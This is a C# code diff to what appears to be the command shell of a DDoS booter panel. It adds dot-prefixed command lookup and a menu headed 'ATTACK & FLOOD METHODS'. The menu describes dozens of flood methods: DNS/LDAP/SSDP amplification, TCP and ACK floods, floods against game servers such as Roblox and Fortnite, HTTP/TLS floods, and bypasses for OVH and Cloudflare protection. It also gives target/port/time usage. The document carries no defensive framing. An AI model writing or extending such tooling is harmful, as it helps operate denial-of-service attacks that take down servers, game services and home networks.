@@ -747,7 +747,8 @@ namespace Agent
             }
             else
             {
-                var method = _methods.Find(m => string.Equals(m.Name, cmdName, StringComparison.OrdinalIgnoreCase));
+                string cleanCmd = cmdName.StartsWith(".") ? cmdName.Substring(1) : cmdName;
+                var method = _methods.Find(m => string.Equals(m.Name, cleanCmd, StringComparison.OrdinalIgnoreCase) || string.Equals(m.Name, cmdName, StringComparison.OrdinalIgnoreCase));
                 if (method != null)
                 {
                     var placeholders = ExtractPlaceholders(method.Cmd);
@@ -757,7 +758,7 @@ namespace Agent
                     if (args.Length < placeholders.Count)
                     {
                         string usage = string.Join(" ", placeholders);
-                        channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Usage: {method.Name} {usage}\x1b[0m\r\n"));
+                        channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Usage: .{method.Name} {usage}\x1b[0m\r\n"));
                         return;
                     }
 
@@ -813,6 +814,53 @@ namespace Agent
                 return "\x1b[91m  [!] No methods configured in methods.json\x1b[0m\r\n";
             }
 
+            var descriptions = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
+            {
+                // LAYER 4 UDP
+                ["dns"] = "DNS flood, overwhelms name servers with forged queries",
+                ["udp"] = "UDP flood, massive spoofed datagram traffic",
+                ["ldap"] = "LDAP flood, overwhelms directory servers with bulk binds",
+                ["ssdp"] = "SSDP flood, overloads devices with discovery requests",
+                ["home"] = "Home DNS flood, targets home network DNS servers",
+                ["udpbypass"] = "UDP Bypass, packets designed to bypass filters",
+
+                // LAYER 4 TCP
+                ["tcp"] = "TCP flood, excessive connection requests",
+                ["socket"] = "Socket flood, exhausts resources via open connections",
+                ["ovh"] = "OVH bypass, anti-DDoS protection bypass",
+                ["tcpmix"] = "TCP Mix, combines techniques to exhaust resources",
+                ["tcpbypass"] = "TCP Bypass, packets designed to bypass filtering",
+                ["ack"] = "ACK flood, disrupts connections with TCP ACK packets",
+
+                // LAYER 4 GAME
+                ["game"] = "Generic game flood, UDP packets disrupt gameplay",
+                ["rainbow"] = "Rainbow Six flood, excessive UDP connection requests",
+                ["rocket"] = "Rocket League flood, exhausts server via UDP connections",
+                ["roblox"] = "Roblox flood, many TCP connections overload servers",
+                ["fivem"] = "FiveM flood, mixed TCP floods disrupt multiplayer",
+                ["pubg"] = "PUBG flood, crafted UDP packets bypass filters",
+                ["fortnite"] = "Fortnite flood, UDP packets cause lag",
+                ["warthunder"] = "War Thunder flood, massive UDP disruption",
+                ["counter"] = "Counter-Strike flood, UDP packets cause delays",
+                ["samp"] = "SA-MP flood, TCP/UDP floods overload servers",
+
+                // LAYER 3
+                ["subnet"] = "Subnet flood, ICMP packets to many IPs in a range",
+                ["icmp"] = "ICMP flood, echo requests overload the network",
+
+                // LAYER 7
+                ["http"] = "HTTP flood, targets web servers via GET/POST",
+                ["https"] = "HTTPS flood, encrypted requests on HTTPS endpoints",
+                ["httpx"] = "HTTP-X, multi-protocol request flood",
+                ["rapidflood"] = "Rapid flood, high rate application layer requests",
+                ["tls"] = "TLS flood, handshake & encrypted session exhaustion",
+                ["tlsx"] = "TLS-X, evades filtering at application layer",
+                ["bypass"] = "Bypass, TLS/HTTPS related evasion technique",
+                ["browser"] = "Browser, simulates real browser traffic (JS/headers)",
+                ["cache"] = "Cache, requests that defeat caching mechanisms",
+                ["cloudflare"] = "Cloudflare, HTTPS flood bypassing CF protection"
+            };
+
             var l4Udp = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "dns", "udp", "ldap", "ssdp", "home", "udpbypass" };
             var l4Tcp = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "tcp", "socket", "ovh", "tcpmix", "tcpbypass", "ack" };
             var l4Game = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "game", "rainbow", "rocket", "roblox", "fivem", "pubg", "fortnite", "warthunder", "counter", "samp" };
@@ -821,9 +869,9 @@ namespace Agent
 
             var sb = new StringBuilder();
             sb.AppendLine();
-            sb.AppendLine("\x1b[38;5;240m  ┌────────────────────────────────────────────────────────────────────────┐\x1b[0m");
-            sb.AppendLine("\x1b[38;5;240m  │\x1b[0m \x1b[1;97m                       ATTACK & FLOOD METHODS                           \x1b[0m\x1b[38;5;240m│\x1b[0m");
-            sb.AppendLine("\x1b[38;5;240m  ├────────────────────────────────────────────────────────────────────────┤\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  ┌──────────────────────────────────────────────────────────────────────────────────┐\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  │\x1b[0m \x1b[1;97m                             ATTACK & FLOOD METHODS                               \x1b[0m\x1b[38;5;240m│\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  ├──────────────────────────────────────────────────────────────────────────────────┤\x1b[0m");
 
             void AppendCategory(string title, string colorCode, HashSet<string> names)
             {
@@ -831,26 +879,17 @@ namespace Agent
                 if (active.Count == 0) return;
 
                 sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  {colorCode}◈ {title}\x1b[0m");
-                int col = 0;
-                sb.Append("\x1b[38;5;240m  │\x1b[0m    ");
                 foreach (var m in active)
                 {
-                    sb.Append($"\x1b[38;5;244m•\x1b[0m \x1b[97m{m.Name,-14}\x1b[0m");
-                    col++;
-                    if (col == 4)
-                    {
-                        sb.AppendLine();
-                        sb.Append("\x1b[38;5;240m  │\x1b[0m    ");
-                        col = 0;
-                    }
+                    string desc = descriptions.TryGetValue(m.Name, out var d) ? d : "Custom execution method";
+                    sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m    \x1b[38;5;244m•\x1b[0m \x1b[96m.{m.Name,-13}\x1b[0m \x1b[90m:\x1b[0m \x1b[38;5;250m{desc}\x1b[0m");
                 }
-                if (col != 0) sb.AppendLine();
                 sb.AppendLine("\x1b[38;5;240m  │\x1b[0m");
             }
 
             AppendCategory("LAYER 4 UDP (AMPLIFICATION & BYPASS)", "\x1b[1;95m", l4Udp);
             AppendCategory("LAYER 4 TCP (FLOOD & BYPASS)", "\x1b[1;94m", l4Tcp);
-            AppendCategory("LAYER 4 GAME (SPECIALIZED UDP)", "\x1b[1;93m", l4Game);
+            AppendCategory("LAYER 4 GAME (SPECIALIZED UDP / TCP)", "\x1b[1;93m", l4Game);
             AppendCategory("LAYER 3 (NETWORK PROTOCOLS)", "\x1b[1;91m", l3);
             AppendCategory("LAYER 7 (HTTP / HTTPS / APPLICATION)", "\x1b[1;92m", l7);
 
@@ -863,10 +902,10 @@ namespace Agent
                 AppendCategory("CUSTOM / OTHER METHODS", "\x1b[1;96m", otherSet);
             }
 
-            sb.AppendLine("\x1b[38;5;240m  ├────────────────────────────────────────────────────────────────────────┤\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  ├──────────────────────────────────────────────────────────────────────────────────┤\x1b[0m");
             sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[90mUsage  :\x1b[0m \x1b[93m<method> <host/ip/url> <port> <time>\x1b[0m");
             sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[90mExample:\x1b[0m \x1b[38;5;45mhttps https://example.com 443 60\x1b[0m");
-            sb.AppendLine("\x1b[38;5;240m  └────────────────────────────────────────────────────────────────────────┘\x1b[0m");
+            sb.AppendLine("\x1b[38;5;240m  └──────────────────────────────────────────────────────────────────────────────────┘\x1b[0m");
 
             return sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n");
         }
